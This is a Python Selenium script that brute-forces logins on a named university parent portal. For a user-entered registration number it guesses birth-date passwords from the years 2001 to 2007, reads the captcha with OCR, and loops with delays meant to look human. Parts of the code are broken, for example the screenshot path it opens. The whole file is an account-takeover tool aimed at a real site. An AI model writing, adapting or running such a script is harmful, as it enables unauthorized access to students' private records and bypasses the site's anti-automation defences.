import random
import time
import pytesseract
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Set up Selenium WebDriver
webdriver_service = Service('path_to_chromedriver')  # Replace with the path to your chromedriver executable
driver = webdriver.Chrome(service=webdriver_service)
driver.get('https://parent.srmap.edu.in/srmapparentcorner/LoginPage')  # Replace with the website URL

# Prompt the user to enter their registered number
registered_number = input("Enter your registered number: ")

# Main loop
while True:
    # Generate random date
    day = random.randint(1, 31)
    month = random.randint(1, 12)
    year = random.randint(2001, 2007)

    # Format the date
    date_string = f"{day:02d}{month:02d}{year}"

    # Fill in the password field with the generated date
    password_field = driver.find_element(By.ID, 'AuthKey')  # Replace 'AuthKey' with the actual ID of the password field on the website
    password_field.clear()  # Clear the password field
    password_field.send_keys(date_string)

    # Fill in the registered number field with user input
    registered_number_field = driver.find_element(By.ID, 'UserName')  # Replace 'UserName' with the actual ID of the registered number field on the website
    registered_number_field.clear()  # Clear the registered number field
    registered_number_field.send_keys(registered_number)

    # Get the captcha image element
    captcha_image_element = driver.find_element(By.ID, 'captcha_image_id')  # Replace 'captcha_image_id' with the actual ID of the captcha image on the website

    # Get the location and size of the captcha image
    captcha_location = captcha_image_element.location
    captcha_size = captcha_image_element.size

    # Take a screenshot of the whole page
    driver.save_screenshot('screenshot.png')

    # Calculate the region of interest (ROI) for the captcha image
    captcha_roi = (
        int(captcha_location['x']),
        int(captcha_location['y']),
        int(captcha_location['x'] + captcha_size['width']),
        int(captcha_location['y'] + captcha_size['height'])
    )

    # Open the screenshot and crop out the captcha image
    screenshot = Image.open('/srmapparentcorner/captchas')
    captcha_image = screenshot.crop(captcha_roi)

    # Save the captcha image locally (optional)
   # captcha_image.save('captcha.png')

    # Use pytesseract to extract text from the captcha image
    captcha_text = pytesseract.image_to_string(captcha_image).strip()

    # Enter the captcha text into the captcha field
    captcha_field = driver.find_element(By.ID, 'ccode')  # Replace 'ccode' with the actual ID of the captcha field on the website
    captcha_field.clear()  # Clear the captcha field
    captcha_field.send_keys(captcha_text)

    # Wait for the page to load and perform further actions
    # Wait for the page to load and perform further actions
    WebDriverWait(driver, 10).until(EC.title_contains('Page Title'))  # Replace 'Page Title' with the expected title of the loaded page

    # Check if the default URL of the page has changed
    if driver.current_url != 'https://parent.srmap.edu.in/srmapparentcorner/LoginPage':  # Replace with the default URL of the page
        break  # Exit the loop if the default URL has changed

    # Add additional actions if needed, such as submitting the form, etc.
    submit_button = driver.find_element(By.ID, 'submit_button_id')  # Replace 'submit_button_id' with the actual ID of the submit button on the website
    submit_button.click()

    # Add a delay to simulate human-like behavior
    time.sleep(2)

# Close the browser
driver.quit()